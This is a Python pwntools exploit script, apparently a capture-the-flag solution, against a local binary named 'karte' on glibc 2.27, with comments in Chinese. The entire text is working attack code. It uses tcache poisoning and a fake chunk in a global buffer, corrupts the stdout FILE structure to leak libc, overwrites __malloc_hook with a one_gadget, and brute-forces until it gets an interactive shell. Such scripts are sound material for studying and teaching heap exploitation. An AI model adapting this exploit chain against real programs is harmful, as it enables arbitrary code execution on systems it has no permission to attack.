# libc2.27
# encoding: utf-8

from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def setName(content):
	r.sendafter('...', content)

def add(size, content):
	r.sendlineafter('>', '1')
	r.sendlineafter('>', str(size))
	r.sendafter('>', content)
	r.recvuntil('id ')
	return r.recvline()


def delete(idx):
	r.sendlineafter('>', '3')
	r.sendlineafter('>', str(idx))

def Modify(idx, content):
	r.sendlineafter('>', '4')
	r.sendlineafter('>', str(idx))
	r.sendafter('>', content)

def rename(content):
	r.sendlineafter('>', '99')
	r.sendafter('...', content)


def DEBUG():
	gdb.attach(r)


name = 0x6021a0

while True:
	try:
		r = process('./karte')
		
		# 獲取 name chunk
		setName(flat(0, 0x81, name+0x20, 0, 0, 0x81))
		for _ in range(7):
			key1 = add(0x60, 'a')
			delete(key1)
		for _ in range(7):
			key1 = add(0x70, 'a')
			delete(key1)

		key1 = add(0x70, 'a')
		key2 = add(0x70, 'a')
		delete(key2)
		delete(key1)
		Modify(key1, p64(name)[:3])
		key1 = add(0x70, 'a')
		key2 = add(0x70, flat(0, 0, 0, 0x81)) # name
		rename(flat(0, 0x71))
		key3 = add(0x70, flat(0, 0, 0, 0, 0, 0, 0, 0, 0, 0x21, 0, 0, 0) + p64(0x21)[:-1])

		# 利用 malloc_consolidate 將 name chunk 放到 small bin
		delete(key1)
		delete(key2)
		rename(flat(0, 0x71, 0, 0, 0, 0x71))
		key2 = add(0x3f0, 'a')
		delete(key2)
		delete(key3)
		key1 = add(0x10, 'a') # name
		delete(key1)

		# 取得 _IO_2_1_stdout_ 附近的 chunk, 並將 _IO_write_base 變小, 就能 leak 出 _IO_2_1_stdout 上面的內容
		rename(flat(0, 0x71, 0, 0, 0, 0x71) + '\x1d\x77')
		key1 = add(0x60, flat(0, 0, 0, 0, 0, 0, 0, 0, 0, 0x21))

		r.sendlineafter('>', '1')
		r.sendlineafter('>', str(0x5b))
		r.sendafter('>', '\x00'*3 + p64(0)*6 + flat(0xfbad1880, 0, 0, 0) + '\x00')

		# 計算 libc_base 、 __malloc_hook 和 one_shot
		libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3ed8b0
		print "libc_base @ " + hex(libc_base)
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[2]
		target = libc_base + libc.symbols['__malloc_hook'] - 0x23
		payload = '\x00'*0x3 + p64(0)*2 + p64(one_shot)	

		# 取得 __malloc_hook 附近的 chunk 並改寫 malloc_hook 為 one_shot
		delete(key1)
		rename(flat(0, 0x71, 0, 0, 0, 0x71, target))

		key1 = add(0x60, 'a')
		key2 = add(0x60, payload)

		# 觸發 malloc
		delete(key1)
		r.sendlineafter('>', '1')
		r.sendlineafter('>', str(0x900))

#		DEBUG()
		r.interactive()


		break
	except EOFError:
		r.close()
	except KeyboardInterrupt:
		break	
